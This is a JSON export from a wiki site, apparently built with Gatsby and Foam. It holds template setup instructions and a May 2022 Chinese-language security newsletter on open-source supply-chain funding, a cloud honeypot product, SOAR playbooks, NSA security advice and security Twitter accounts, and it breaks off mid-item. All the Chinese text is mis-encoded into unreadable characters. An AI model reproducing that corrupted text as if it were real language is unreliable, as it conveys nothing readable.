{"data":{"allMdx":{"nodes":[{"fields":{"slug":"/placeholder/","title":"This Is a Placeholder File for Mdx"},"frontmatter":{"draft":true},"rawBody":"---\ntitle: This Is a Placeholder File for Mdx\ndraft: true\ntags:\n  - gatsby-theme-primer-wiki-placeholder\n---\n"},{"fields":{"slug":"/","title":"å…³äºè¿™ä¸ªç«™ç‚¹"},"frontmatter":{"draft":false},"rawBody":"---\r\n\r\n---\r\n\r\n# å…³äºè¿™ä¸ªç«™ç‚¹\r\n\r\n**ğŸ‘‹Another Foam template that use [gatsby-theme-primer-wiki](https://github.com/theowenyoung/gatsby-theme-primer-wiki), Welcome to your new Foam Knowledge Base!**\r\n\r\n## Examples\r\n\r\n- [Demo](https://demo-wiki.owenyoung.com) - ([Source](https://github.com/theowenyoung/gatsby-theme-primer-wiki/tree/main/example))\r\n- [Everything I Know by Owen](https://wiki.owenyoung.com/) - ([Source](https://github.com/theowenyoung/wiki))\r\n- [Foam Demo](https://demo-foam.owenyoung.com/) - ([Source](https://github.com/theowenyoung/foam-template-gatsby-theme-primer-wiki))\r\n- [Obsidian Demo](https://demo-obsidian.owenyoung.com/) - ([Source](https://github.com/theowenyoung/obsidian-template-gatsby-theme-primer-wiki))\r\n- [Gatsby Starter Demo](https://demo-gatsby-starter-primer-wiki.owenyoung.com/) - ([Source](https://github.com/theowenyoung/gatsby-starter-primer-wiki))\r\n\r\n## Features\r\n\r\n- Support Local search, full-text search.\r\n- Support Graph Visualisation with canvas.\r\n- Support Tags, Tags First, Generating tag pages, also connecting with graph visualisation.\r\n- Support [Gitbook](https://docs.gitbook.com/integrations/github/content-configuration#summary) styled `SUMMARY.md` for custom sidebar.\r\n- Support `[[WikiLink]]`, But you'd better use [Link Reference Definitions](https://foambubble.github.io/foam/features/link-reference-definitions) with extensions, `\"foam.edit.linkReferenceDefinitions\": \"withExtensions\"`\r\n- Support Light/Dark Theme\r\n- Custom Header Nav Items\r\n- Nested sidebar\r\n- Support Google Analytics\r\n- Support Sitemap/Robot\r\n- SEO optimization\r\n- Support path prefix\r\n\r\n## Principles\r\n\r\nHere are my main ideas/principles in designing this theme.\r\n\r\n1. No vendor lock-in. The less vendor features you use, the better you'll be able to migrate. `[[Wikilink]]` is the only non-markdown feature supported by default, but nonetheless, it is recommended to use the standard markdown syntax, or if you edit with [Foam](https://github.com/foambubble/foam), please use [Wikilink](https://foambubble.github.io/foam/wikilinks) with [Link Reference Definitions](https://foambubble.github.io/foam/features/link-reference-definitions). That give us the capability change our theme, or hosted place.\r\n2. Use meta data instead of special characters. We should use `tags` as the document's metadata, not `#tag` in the plain text.\r\n3. Use tags instead of categories. Minimal subfolders.\r\n\r\n## Getting started\r\n\r\n### For new wiki\r\n\r\nThis documentation assumes that you have a GitHub account and have [Visual Studio Code](https://code.visualstudio.com/) installed on your Linux/MacOS/Windows machine.\r\n\r\n1. If you haven't yet, browse over to the main [Foam documentation](https://foambubble.github.io/foam) to get an idea of what Foam is and how to use it.\r\n2. Press \"Use this template\" button at [foam-template-gatsby-theme-primer-wiki](https://github.com/theowenyoung/foam-template-gatsby-theme-primer-wiki/generate) (that's this repository!) to fork it to your own GitHub account. If you want to keep your thoughts to yourself, remember to set the repository private.\r\n3. [Clone the repository to your local machine](https://help.github.com/en/github/creating-cloning-and-archiving-repositories/cloning-a-repository) and open it in VS Code.\r\n\r\n   _Open the repository as a folder using the `File > Open...` menu item._\r\n\r\n4. When prompted to install recommended extensions, click **Install all** (or **Show Recommendations** if you want to review and install them one by one)\r\n5. Delete all `.md` files you don't need, Change Site settings at `.layouts/gatsby-config.js`, change your CNAME at `.layouts/static/CNAME`, change your icon at `.layouts/static/logo.png`, commit your changes, and push to github, change your page settings at Github, make sure you set the page branch to `gh-pages`, then when github actions runed, you can visit your site.\r\n\r\nAfter setting up the repository, head to [[getting-started]] to get familiar with your new knowledge base!\r\n\r\nTo learn more about how to use **Foam**, read the [Recipes](https://foambubble.github.io/foam/recipes/recipes) bubbles of the Foam documentation workspace.\r\n\r\nAnd remember that you can always join our [Foam community on Discord](https://foambubble.github.io/join-discord/g)!\r\n\r\n### For exist wiki\r\n\r\n### Exist Wiki\r\n\r\n1. Clone this repo to your local machine\r\n\r\n```bash\r\ngit clone https://github.com/theowenyoung/foam-template-gatsby-theme-primer-wiki.git\r\n```\r\n\r\n2. Copy `.layouts`, `.github` `.gitignore` to your wiki folder.\r\n\r\n## Config\r\n\r\nSee [here](https://github.com/theowenyoung/gatsby-theme-primer-wiki#usage)\r\n\r\n## Local Preview\r\n\r\n```bash\r\ncd .layouts\r\nnpm i\r\nnpm start\r\n```\r\n\r\n\r\n## Deploy\r\n\r\nDeploy to Github Pages, see `.github/workflows/deploy.yml`,\r\n\r\n### Path Prefix\r\n\r\nIf you want deploy your site with prefix path, \r\n\r\n1. change `gatsby-config.js` with:\r\n\r\n```javascript\r\nmodule.exports = {\r\n  pathPrefix: `/blog`,\r\n}\r\n```\r\n\r\n2. set your build script with `gatsby build --prefix-paths`,\r\n\r\n\r\n3. Local Preview with `gatsby serve --prefix-paths`\r\n\r\n\r\nAlso see the original docs: <https://www.gatsbyjs.com/docs/how-to/previews-deploys-hosting/path-prefix/#add-to-gatsby-configjs>\r\n\r\n## Using Foam\r\n\r\nWe've created a few Bubbles (markdown documents) to get you started.\r\n\r\n- [[inbox]] - a place to write down quick notes to be categorized later\r\n- [[getting-started]] - learn how to use your Foam workspace\r\n- [[todo]] - a place to keep track of things to do\r\n\r\nIn the `docs` directory you can find everything you need to learn the basics of Foam.\r\n\r\n\r\n"},{"fields":{"slug":"/å®‰å…¨é€šè®¯ Security.News/Security.News@202205/","title":"Security.News@202205"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: Security.News@202205\r\ntags:\r\n  - å®‰å…¨é€šè®¯ Security.News\r\n  - ä¾›åº”é“¾å®‰å…¨\r\n  - è¡Œä¸šåŠ¨æ€\r\n  - å®‰å…¨äº‹ä»¶\r\n  - è¡Œä¸šæŠ¥å‘Š\r\n  - å­¦ä¹ èµ„æº\r\n  - Google\r\n  - é˜¿é‡Œäº‘\r\n  - èœœç½\r\n  - SOAR\r\n  - é›¾å¸œæ™ºèƒ½\r\n  - Twitter\r\n  - NSA\r\n  - æœ€ä½³å®è·µ\r\n  - æ•°æ®æ³„éœ²\r\n  - é’“é±¼\r\n---\r\n\r\n## ä¾›åº”é“¾/å¼€æºè½¯ä»¶å®‰å…¨\r\n\r\n### **å¼€æºå®‰å…¨åŸºé‡‘ä¼šå’Œ Linux åŸºé‡‘ä¼šå‘¼å1.5äº¿ç¾å…ƒæ¥æ”¹å–„å¼€æºå®‰å…¨**\r\n\r\näºšé©¬é€Šã€çˆ±ç«‹ä¿¡ã€è°·æ­Œã€è‹±ç‰¹å°”ã€å¾®è½¯å’Œ VMWare å·²ç»æ‰¿è¯ºæä¾›3000ä¸‡ç¾å…ƒã€‚æ›´å¤šèµ„é‡‘å·²ç»åœ¨è·¯ä¸Šäº†ï¼Œäºšé©¬é€ŠAWSå·²ç»æ‰¿è¯ºé¢å¤–æä¾›1000ä¸‡ç¾å…ƒã€‚\r\n\r\nä»¥ä¸‹æ˜¯å¼€æºè¡Œä¸šè‡´åŠ›äºå®ç°çš„åä¸ªç›®æ ‡ã€‚\r\n    1. å®‰å…¨æ•™è‚²: å‘æ‰€æœ‰äººæä¾›åŸºçº¿å®‰å…¨è½¯ä»¶å¼€å‘æ•™è‚²å’Œè®¤è¯ã€‚\r\n    2. é£é™©è¯„ä¼°: ä¸ºå‰10,000(æˆ–æ›´å¤š) OSS ç»„ä»¶å»ºç«‹ä¸€ä¸ªå…¬å¼€çš„ã€ä¾›åº”å•†ä¸­ç«‹çš„ã€åŸºäºå®¢è§‚åº¦é‡çš„é£é™©è¯„ä¼°ä»ªè¡¨æ¿ã€‚\r\n    3. æ•°å­—ç­¾å: åŠ å¿«é‡‡ç”¨è½¯ä»¶ç‰ˆæœ¬çš„æ•°å­—ç­¾åã€‚\r\n    4. å†…å­˜å®‰å…¨: é€šè¿‡æ›¿æ¢éå†…å­˜å®‰å…¨è¯­è¨€æ¥æ¶ˆé™¤è®¸å¤šæ¼æ´çš„æ ¹æœ¬åŸå› ã€‚\r\n    5. äº‹ä»¶å“åº”: å»ºç«‹ OpenSSF å¼€æºå®‰å…¨äº‹ä»¶å“åº”å°ç»„ï¼Œå®‰å…¨ä¸“å®¶å¯ä»¥åœ¨å…³é”®æ—¶åˆ»ååŠ©å¼€æºé¡¹ç›®å“åº”æ¼æ´ã€‚\r\n    6. æ›´å¥½çš„æ‰«æ: é€šè¿‡å…ˆè¿›çš„å®‰å…¨å·¥å…·å’Œä¸“å®¶æŒ‡å¯¼ï¼ŒåŠ é€Ÿç»´æŠ¤äººå‘˜å’Œä¸“å®¶å‘ç°æ–°çš„æ¼æ´ã€‚\r\n    7. ä»£ç å®¡è®¡: æ¯å¹´å¯¹å¤šè¾¾200ä¸ªæœ€å…³é”®çš„å¼€æ”¾æºç è½¯ä»¶ç»„ä»¶è¿›è¡Œä¸€æ¬¡ç¬¬ä¸‰æ–¹ä»£ç å®¡æŸ¥(ä»¥åŠä»»ä½•å¿…è¦çš„è¡¥æ•‘å·¥ä½œ)ã€‚\r\n    8. æ•°æ®å…±äº«: åè°ƒæ•´ä¸ªè¡Œä¸šçš„æ•°æ®å…±äº«ï¼Œä»¥æ”¹è¿›æœ‰åŠ©äºç¡®å®šæœ€å…³é”® OSS ç»„ä»¶çš„ç ”ç©¶ã€‚\r\n    9. è½¯ä»¶ç‰©æ–™æ¸…å•(SBOMs) : åˆ°å¤„æ”¹è¿› SBOM çš„å·¥å…·å’ŒåŸ¹è®­ï¼Œä»¥æ¨åŠ¨é‡‡ç”¨ã€‚\r\n    10. æ”¹è¿›çš„ä¾›åº”é“¾: é€šè¿‡æ›´å¥½çš„ä¾›åº”é“¾å®‰å…¨å·¥å…·å’Œæœ€ä½³å®è·µï¼ŒåŠ å¼º10ä¸ªæœ€å…³é”®çš„ä¾›åº”é“¾/å¼€æºè½¯ä»¶æ„å»ºç³»ç»Ÿã€åŒ…ç®¡ç†å™¨å’Œåˆ†é”€ç³»ç»Ÿã€‚\r\n\r\n#### ä¸€äº›æ„Ÿæ‚Ÿ\r\n> ä»Strust2ã€Heartbleedã€Solarwindsåˆ°Log4jï¼Œå¯ä»¥çœ‹åˆ°ä¾›åº”é“¾/å¼€æºè½¯ä»¶çš„æ¼æ´å½±å“æ˜¯å¤šä¹ˆæ·±è¿œï¼Œç°åœ¨è¶Šæ¥è¶Šå¤šçš„ç§‘æŠ€å·¨å¤´åŠ å…¥æ²»ç†ï¼Œå¸Œæœ›èƒ½æ”¹å–„ä¾›åº”é“¾/å¼€æºè½¯ä»¶è¿™å—â€œé‡‘ä¸‰è§’â€ï¼›å¯¹åº”å›½å†…ç±»ä¼¼çš„ç›¸å…³æ²»ç†å»ºè®®ï¼Œå¯ä»¥å‚è€ƒCNCERTçš„ã€Š2021 å¹´å¼€æºè½¯ä»¶ä¾›åº”é“¾å®‰å…¨é£é™©ç ”ç©¶æŠ¥å‘Šã€‹ã€‚\r\n\r\n#### å‚è€ƒèµ„æ–™\r\n- https://www.zdnet.com/article/white-house-joins-openssf-and-the-linux-foundation-in-securing-open-source-software/\r\n- https://www.cert.org.cn/publish/main/upload/File/2021%20Risk%20Analysis%20Report%20of%20Open%20Source%20Software%20%20.pdf\r\n\r\n### Googleå®£å¸ƒæˆç«‹â€œå¼€æºç»´æŠ¤ç»„â€\r\n\r\nåœ¨è¿™æ¬¡ä¼šè®®ï¼ˆå‰é¢æåˆ°çš„OpenSSFä¼šè®®ï¼‰ä¸Šï¼ŒGoogleå®£å¸ƒæˆç«‹æ–°çš„â€œå¼€æºç»´æŠ¤å°ç»„â€â€”â€”ä¸€ä¸ªç”±Googleå·¥ç¨‹å¸ˆç»„æˆçš„æ•¬ä¸šå›¢é˜Ÿï¼Œä»–ä»¬å°†ä¸ä¸Šæ¸¸ç»´æŠ¤è€…ç´§å¯†åˆä½œï¼Œæé«˜å…³é”®å¼€æºé¡¹ç›®çš„å®‰å…¨æ€§ã€‚é™¤äº†è¿™ä¸€ä¸¾æªï¼Œæˆ‘ä»¬è¿˜æå‡ºäº†ä¸€äº›æƒ³æ³•ï¼Œå¹¶å‚ä¸äº†å…³äºæé«˜å¼€æ”¾æºç è½¯ä»¶çš„å®‰å…¨æ€§å’Œå¯ä¿¡åº¦çš„è®¨è®ºã€‚\r\n\r\nGoogleæå‡ºäº†ä¸€ä¸ªç”¨äºè§£å†³å¼€æºæ¼æ´çš„æ¡†æ¶ï¼šäº†è§£ï¼Œé¢„é˜²ï¼Œä¿®å¤ï¼›å¸Œæœ›åœ¨æ¨è¿›å’Œæ”¹è¿›è½¯ä»¶ä¾›åº”é“¾å®‰å…¨çš„äº‹ä¸šä¸­äº§ç”ŸåŠ¨åŠ›ã€‚\r\n    1. äº†è§£ï¼šæˆ‘ä»¬â€œäº†è§£â€çš„ç›®æ ‡æ˜¯æ•è·æ›´ç²¾ç¡®çš„æ¼æ´æ•°æ®ï¼Œå»ºç«‹ä¸€ä¸ªæ ‡å‡†æ¨¡å¼æ¥è·Ÿè¸ªè·¨æ•°æ®åº“çš„æ¼æ´ï¼Œå¹¶åˆ›å»ºå·¥å…·æ¥æ›´å¥½åœ°è·Ÿè¸ªä¾èµ–å…³ç³»ã€‚\r\n        åœ¨ Log4j æ¼æ´å“åº”æœŸé—´ï¼Œgoogle æ”¯æŒçš„ [Open Source Insights](https://deps.dev/) é¡¹ç›®å¸®åŠ©ç¤¾åŒº[äº†è§£æ¼æ´çš„å½±å“](https://security.googleblog.com/2021/12/understanding-impact-of-apache-log4j.html)ã€‚\r\n    2. é¢„é˜²ï¼šä¸ºäº†å¸®åŠ©ç”¨æˆ·äº†è§£æ–°ä¾èµ–é¡¹çš„é£é™©ï¼Œä»¥ä¾¿ä»–ä»¬èƒ½å¤Ÿå¯¹æ‰€ä½¿ç”¨çš„åŒ…å’Œç»„ä»¶åšå‡ºæ˜æ™ºçš„å†³ç­–ã€‚\r\n        æˆ‘ä»¬å·²ç»çœ‹åˆ°ç¤¾åŒºåœ¨é¢„é˜²æ¼æ´æ–¹é¢çš„å¼ºæœ‰åŠ›çš„å‚ä¸ï¼Œå°¤å…¶æ˜¯åœ¨å®‰å…¨è®°åˆ†å¡é¡¹ç›®ä¸­ã€‚[Scorecards](https://securityscorecards.dev/) è¯„ä¼°é¡¹ç›®éµå®ˆå®‰å…¨æœ€ä½³å®è·µçš„æƒ…å†µï¼Œå¹¶ä¸ºå¼€å‘äººå‘˜åœ¨ä½¿ç”¨ä¾èµ–é¡¹ä¹‹å‰å¯ä»¥å‚è€ƒçš„è¯„åˆ†è¿›è¡Œåˆ†é…ã€‚\r\n    3. ä¿®å¤ï¼šä¸ºäº†å¸®åŠ©ç”¨æˆ·ç†è§£ä»–ä»¬çš„é€‰æ‹©ï¼Œä»¥æ¶ˆé™¤æ¼æ´ï¼Œä½¿é€šçŸ¥èƒ½å¤Ÿå¸®åŠ©åŠ é€Ÿä¿®å¤ï¼Œå¹¶ä¿®å¤å—å½±å“è½¯ä»¶çš„å¹¿æ³›ä½¿ç”¨çš„ç‰ˆæœ¬ï¼Œè€Œä¸ä»…ä»…æ˜¯æœ€æ–°çš„ç‰ˆæœ¬ã€‚\r\n        Googleå»å¹´ä¸ºå¼€æºé¡¹ç›®æä¾›äº†1500ä¸‡ç¾å…ƒã€‚è¿™åŒ…æ‹¬750ä¸‡ç¾å…ƒï¼Œç”¨äºä¾›åº”é“¾å®‰å…¨ã€æ¨¡ç³Šã€å†…æ ¸å®‰å…¨å’Œå…³é”®åŸºç¡€è®¾æ–½å®‰å…¨ç­‰é¢†åŸŸçš„å®šå‘å®‰å…¨å·¥ä½œã€‚\r\n\r\n#### ä¸€äº›æ„Ÿæ‚Ÿ\r\n> è°·æ­Œæ˜¯å¼€æºçš„æœ€å¤§å•†ä¸šç”¨æˆ·ä¹‹ä¸€ï¼Œå¦‚æœæ²¡æœ‰å¼€æºè½¯ä»¶ï¼ŒGoogleçš„å¤§éƒ¨åˆ†æœåŠ¡éƒ½ä¸ä¼šå­˜åœ¨ã€‚\r\n>\r\n> å…¶å®æ•´ä¸ªäº’è”ç½‘è¡Œä¸šéƒ½æ˜¯å¼€æºè½¯ä»¶çš„æœ€å¤§å—ç›Šè€…ï¼Œä½†å®ƒä»¬å·²ç»ç™½å«–ä¹ æƒ¯äº†â€¦â€¦\r\n\r\n#### å‚è€ƒèµ„æ–™\r\n- https://blog.google/technology/safety-security/shared-success-in-building-a-safer-open-source-community/\r\n\r\n## è¡Œä¸šåŠ¨æ€\r\n\r\n### é˜¿é‡Œäº‘äº‘åŸç”Ÿèœœç½é‡ç£…å‘å¸ƒ\r\nHoneyPotæŠ€æœ¯ç”±æ¥å·²ä¹…ï¼Œé€šè¿‡è¯±é¥µèµ„äº§ä¸ç”¨æˆ·çœŸå®èµ„äº§æ··åˆéƒ¨ç½²ï¼Œæå‡å†…ç½‘æ„Ÿ\r\n\r\nçŸ¥åŠ›ã€å¹¶å¢åŠ æ”»å‡»å¤æ‚åº¦ï¼Œæ˜¯æ‰“ç ´æ”»é˜²ä¸å¯¹ç­‰çš„é‡è¦æ‰‹æ®µã€‚\r\n\r\nä½†æ˜¯ï¼Œä¼ ç»Ÿèœœç½æ¬ºéª—é˜²å¾¡æ–¹æ¡ˆå¾€å¾€å› ä¸ºæˆæœ¬ã€çœŸå®åº¦ç­‰é—®é¢˜ä¸èƒ½å®ç°é«˜è¦†ç›–ï¼Œå½¢æˆâ€œä¸å¯èƒ½ä¸‰è§’ã€ã€‚\r\n\r\n![é˜¿é‡Œäº‘äº‘åŸç”Ÿèœœç½](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/dYd6gT.jpg)\r\n    \r\näº‘èœœç½ä½¿ç”¨å››å¤§æŠ€æ³•ï¼Œæ‰“ç ´ä¸å¯èƒ½ï¼š\r\n1. VPCé»‘æ´æ¢é’ˆ\r\n2. ä¸»æµåº”ç”¨ç±»å‹å…¨è¦†ç›–\r\n3. ä¼ªè£…ç¨‹åº¦éšå¿ƒé…ç½®\r\n4. è”åŠ¨é˜²å¾¡ä¸æº¯æºååˆ¶\r\n\r\n#### ä¸€äº›æ„Ÿæ‚Ÿ\r\n> äº‘åŸç”Ÿèœœç½çš„ä¼˜åŠ¿åœ¨äºå¾®æœåŠ¡æ¶æ„çš„é«˜çµæ´»æ€§å’Œå¯ç»´æŠ¤æ€§ï¼Œåˆ©ç”¨äº‘å¹³å°è®¾æ–½å®ç°å¿«é€Ÿéƒ¨ç½²å’Œå¼¹æ€§ä¼¸ç¼©ï¼›AWS Marketplaceä¸Šå·²ç»æœ‰äº†å¾ˆå¤šæ”¯æŒäº‘åŸç”Ÿçš„èœœç½äº§å“ã€‚\r\n\r\n#### å‚è€ƒèµ„æ–™\r\n- https://developer.aliyun.com/article/927892\r\n- https://aws.amazon.com/marketplace/search?searchTerms=honeypot\r\n\r\n### é›¾å¸œæ™ºèƒ½å‘å¸ƒã€Šå›½å†…SOARé¢†åŸŸé¦–ä¸ªTop 10å®‰å…¨å‰§æœ¬æœ€ä½³å®è·µã€‹\r\næˆ‘ä»¬é‚€è¯·è¿‡å»3å¹´ä¸­éƒ¨åˆ†å·²ç»éƒ¨ç½²æˆ–å³å°†éƒ¨ç½²é›¾å¸œSOARï¼ˆHoneyGuideï¼‰çš„å®¢æˆ·è¿›è¡Œäº†ä¸€å¯¹ä¸€çš„è®¿è°ˆã€‚åœ¨æœ¬æ¬¡è®¿è°ˆä¸­ï¼Œæˆ‘ä»¬ä¸€å…±æ”¶é›†äº†å°†è¿‘400ä¸ªåœ¨ç”¨å‰§æœ¬ã€‚æˆ‘ä»¬çš„ä¸“å®¶å›¢é˜Ÿå¯¹è¿™400ä¸ªå‰§æœ¬å’Œæˆ‘ä»¬å·²æœ‰çš„å‰§æœ¬ä»“åº“ä¸­çš„100å¤šä¸ªå‰§æœ¬æ¨¡æ¿ï¼Œæ€»è®¡çº¦500ä¸ªå‰§æœ¬è¿›è¡Œäº†ç»Ÿè®¡ã€åˆ†æå’Œè¯„ä¼°ã€‚æœ€ç»ˆï¼Œæˆ‘ä»¬ä»ä¸­æ•´ç†äº†10ä¸ªè¢«è®¤ä¸ºé€šç”¨ä¸”æœ€æœ‰ä»·å€¼çš„ä¼˜ç§€å‰§æœ¬ï¼Œå€Ÿæœ¬æ¬¡äº§å“å‘å¸ƒä¼šçš„æœºä¼šåˆ†äº«ç»™å¤§å®¶ã€‚è¿™äº›å‰§æœ¬æ¶µç›–äº‹ä»¶å“åº”ã€æ¼æ´ç®¡ç†å’Œåº”æ€¥é¢„æ¡ˆç­‰å¤šä¸ªæ–¹é¢ï¼Œå¸Œæœ›èƒ½æŠ›ç –å¼•ç‰ï¼Œä¸å¤§å®¶æ¢è®¨SOARå‰§æœ¬çš„æœ€ä½³å®è·µã€‚\r\n\r\nå‰§æœ¬åˆ—è¡¨\r\n\r\n[å‰§æœ¬åˆ—è¡¨](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/RETRHL.jpg)\r\n\r\n#### ä¸€äº›æ„Ÿæ‚Ÿ\r\n> çœ‹åˆ°SOARå¹³å°ï¼Œæˆ‘çš„ç¬¬ä¸€ååº”å°±æ˜¯ä½ä»£ç å¹³å°ï¼Œå¦‚Node-REDï¼Œä½†æ ¹æ®Gartnerå¯¹SOARæœ€æ–°çš„å®šä¹‰ï¼Œå¼ºè°ƒäº†SOARæ˜¯ä¸€ç§ä¸ºäººæä¾›æœºå™¨ååŠ©çš„è§£å†³æ–¹æ¡ˆï¼Œé‡ç‚¹åœ¨äººä¸æµç¨‹ï¼ˆPeople and Processï¼‰ï¼Œè€Œä¸æ˜¯å•çº¯çš„ç¼–æ’ä¸è‡ªåŠ¨åŒ–å·¥å…·ï¼›æˆ–è®¸å¯ä»¥ç§°ä¹‹ä¸ºSOA for humanã€‚\r\n\r\n#### å‚è€ƒèµ„æ–™\r\n- https://www.secrss.com/articles/24043\r\n\r\n### ç¾å›½å›½å®¶å®‰å…¨å±€å’Œå…¶ç›Ÿå‹å‘å¸ƒç½‘ç»œå®‰å…¨å»ºè®®\r\nCISA åœ¨ NSA å’Œå…¶ä»–åˆä½œä¼™ä¼´çš„å¸®åŠ©ä¸‹åˆ¶å®šäº†è¯¥å»ºè®®ã€‚ å…¶ä¸­åŒ…æ‹¬ FBIã€åŠ æ‹¿å¤§ç½‘ç»œå®‰å…¨ä¸­å¿ƒ (CCCS)ã€æ–°è¥¿å…°å›½å®¶ç½‘ç»œå®‰å…¨ä¸­å¿ƒ (NCSC-NZ) å’Œè®¡ç®—æœºåº”æ€¥å“åº”å°ç»„ (CERT NZ)ã€è·å…°å›½å®¶ç½‘ç»œå®‰å…¨ä¸­å¿ƒ (NCSC-NL)ï¼Œä»¥åŠ è‹±å›½å›½å®¶ç½‘ç»œå®‰å…¨ä¸­å¿ƒï¼ˆNCSC-UKï¼‰å°±è¯¥å’¨è¯¢ã€‚ è®¸å¤šç›¸åŒçš„ç½‘ç»œå®‰å…¨æœºæ„åœ¨ 4 æœˆ 27 æ—¥åˆä½œå‘å¸ƒäº†è¡¥å……å…¬å‘Šï¼Œå…¶ä¸­å¼ºè°ƒäº†è‡ª 2021 å¹´ä»¥æ¥æœ€å¸¸è¢«åˆ©ç”¨çš„æ¼æ´ã€‚\r\n\r\nNSAæ¨èçš„ä¸ƒå¤§å®‰å…¨æœ€ä½³å®è·µ\r\n    - è®¿é—®æ§åˆ¶\r\n    - åŠ å›ºå‡­æ®\r\n    - æ—¥å¿—é›†ä¸­ç®¡ç†\r\n    - ä½¿ç”¨é˜²ç—…æ¯’è½¯ä»¶\r\n    - éƒ¨ç½²æ£€æµ‹å·¥å…·\r\n    - ä½¿ç”¨å®‰å…¨é…ç½®æ“ä½œåœ¨å¯è®¿é—® Internet çš„ä¸»æœºä¸Šå…¬å¼€çš„æœåŠ¡\r\n    - ä¿æŒè½¯ä»¶æ›´æ–°\r\n\r\n#### ä¸€äº›æ„Ÿæ‚Ÿ\r\n> é‡Œé¢å¤§å¤šæ•°å»ºè®®éƒ½å¯ä»¥åœ¨CIS Critical Controlsä¸­çœ‹åˆ°ï¼Œç›¸å½“äºä¸€ä¸ªMVPï¼ˆæœ€å°å¯ç”¨äº§å“ï¼‰ã€‚\r\n>\r\n> å¼•ç”¨èµµå½¦åœ¨ã€Šä»Googleç™½çš®ä¹¦çœ‹ä¼ä¸šå®‰å…¨æœ€ä½³å®è·µã€‹ä¸­æåˆ°çš„ä¸€å¥è¯ï¼šæ²¡æœ‰ä¸šç•Œå®‰å…¨å¤§ä¼šä¸Šé‚£äº›èŠ±ä¿çš„æ¦‚å¿µå’Œåè¯ï¼Œå…¨éƒ½æ˜¯æ­£ç»Ÿçš„å®‰å…¨è®¾è®¡æ€è·¯ï¼Œä»¥æ—¢æœ‰çš„ç®€å•çš„å®‰å…¨æ‰‹æ®µè§£å†³å¤æ‚çš„é—®é¢˜ã€‚\r\n\r\n#### å‚è€ƒèµ„æ–™\r\n- https://media.defense.gov/2022/May/17/2002998718/-1/-1/0/CSA_WEAK_SECURITY_CONTROLS_PRACTICES_EXPLOITED_FOR_INITIAL_ACCESS.PDF\r\n- https://www.cisecurity.org/controls\r\n\r\n## å­¦ä¹ èµ„æº\r\n### SentinelOne æ¨è2022å¹´è¦å…³æ³¨çš„22ä¸ªå®‰å…¨ç±»Twitterè´¦å·\r\n\r\nä¿¡æ¯å®‰å…¨åœ¨äºçŸ¥è¯†åˆ†äº«ï¼Œåœ¨ Twitter ä¸Šä½ ä¼šå‘ç°æˆ‘ä»¬è¿™ä¸ªè¡Œä¸šæœ€ä¼˜ç§€æœ€èªæ˜çš„äººå°±æ˜¯è¿™ä¹ˆåšçš„ã€‚é‚£ä¹ˆï¼Œåœ¨2022å¹´ï¼Œä½ åº”è¯¥è·Ÿéšè°æ¥å…³æ³¨æ—¶äº‹ï¼Œæ‰©å±•ä½ çš„çŸ¥è¯†ï¼Œå­¦ä¹ æ–°çš„æŠ€èƒ½å’Œèµ„æºå‘¢ï¼Ÿæˆ‘ä»¬ç²¾å¿ƒæŒ‘é€‰äº†22ä¸ªé‡è¦çš„ç½‘ç»œå®‰å…¨è´¦æˆ·ï¼Œè™½ç„¶ä½ å¯ä»¥åœ¨æˆ‘ä»¬å‰å‡ å¹´çš„[Twitteråå•](https://www.google.com/search?q=site%3Ahttp%3A%2F%2Fsentinelone.com++twitter+accounts+following&ie=UTF-8&oe=UTF-8)ä¸­æ‰¾åˆ°ä¸€äº›æ¨èï¼Œä½†ä»Šå¹´çš„åå•ä¸Šä¹Ÿæœ‰è®¸å¤šæ–°çš„ã€æœ‰è¶£çš„ã€æœ‰å½±å“åŠ›çš„æ¨ç‰¹ç”¨æˆ·ã€‚è®©æˆ‘ä»¬æ¥çœ‹çœ‹å§ï¼\r\n\r\n- åå•\r\n  - [@KimZetter](https://twitter.com/KimZetter)\r\n  - [@maddiestone](https://twitter.com/maddiestone)\r\n  - [@cyb3rops](https://twitter.com/cyb3rops)\r\n  - [@campuscodi](https://twitter.com/campuscodi)\r\n  - [@cglyer](https://twitter.com/cglyer)\r\n  - [@billyleonard](https://twitter.com/billyleonard)\r\n  - [@Kostastsale](https://twitter.com/Kostastsale)\r\n  - [@vxunderground](https://twitter.com/vxunderground)\r\n  - [@likethecoins](https://twitter.com/likethecoins)\r\n  - [@RidT](https://twitter.com/RidT)\r\n  - [@theJoshMeister](https://twitter.com/theJoshMeister)\r\n  - [@ryanaraine](https://twitter.com/ryanaraine)\r\n  - [@craiu](https://twitter.com/craiu)\r\n  - [@AricToler](https://twitter.com/AricToler)\r\n  - [@evacide](https://twitter.com/evacide)\r\n  - [@4n6lady](https://twitter.com/4n6lady)\r\n  - [@zackwhittaker](https://twitter.com/zackwhittaker)\r\n  - [@trufae](https://twitter.com/trufae)\r\n  - [@Fox0x01](https://twitter.com/Fox0x01)\r\n  - [@HostileSpectrum](https://twitter.com/HostileSpectrum)\r\n  - [@GossiTheDog](https://twitter.com/GossiTheDog)\r\n  - [@juanandres_gs](https://twitter.com/juanandres_gs)\r\n\r\n#### ä¸€äº›æ„Ÿæ‚Ÿ\r\n> å¥½å¥½å­¦ä¹ ï¼Œå¤©å¤©å‘ä¸Šï¼›å¦å¤–æ¨èä¸¤ä¸ªå¯ä»¥Followçš„Twitter Listï¼šOffense and Infosec Under 2.5k ã€‚\r\n\r\n#### å‚è€ƒèµ„æ–™\r\n- https://www.sentinelone.com/blog/22-cybersecurity-twitter-accounts-you-should-follow-in-2022/\r\n\r\n## å®‰å…¨äº‹ä»¶\r\n### ä¸­å›½äº’è”ç½‘å…¬å¸æœç‹çš„å‘˜å·¥è¢«ç”µå­é‚®ä»¶æ¬ºè¯ˆæ¬ºéª—ï¼Œæ‰¿è¯ºç»™é‚£äº›æä¾›ä»–ä»¬é“¶è¡Œæ•°æ®çš„äººâ€œæ´¥è´´â€\r\n\r\nä¸­å›½äº’è”ç½‘é—¨æˆ·ç½‘ç«™æœç‹ç½‘å‘¨ä¸‰è¡¨ç¤ºï¼Œ20å¤šåå‘˜å·¥åœ¨ä¸€èµ·ç”µå­é‚®ä»¶è¯ˆéª—æ¡ˆä¸­æŸå¤±è¶…è¿‡4ä¸‡å…ƒäººæ°‘å¸(åˆ6000ç¾å…ƒ) 